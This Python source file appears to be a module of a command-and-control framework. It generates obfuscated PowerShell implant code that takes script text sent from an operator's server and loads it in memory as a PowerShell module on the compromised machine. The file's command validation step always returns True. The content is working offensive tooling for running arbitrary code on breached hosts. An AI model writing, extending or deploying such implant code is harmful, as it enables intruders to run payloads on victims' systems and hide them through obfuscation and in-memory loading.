class LoadModule:
    type = "LM"
    args = "name of powershell module on server"
    input = "load_module"

    def process_implant_response(self,data, args):
        return f"Load module:\n{data.decode()}", None

    def implant_text(self):
        var = '''
function {{ ron.obf_load_module }} ($data) {
    $b = $data
    $data = $b -split '::', 2
    $name = $data[0].Replace(" ","")
    $bgt = $data[1]
    $b = [ScriptBlock]::Create($bgt)
    New-Module -ScriptBlock $b -Name $name -Verbose | Import-Module
    $global:tr = Get-Command -Module $name -Verbose
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True
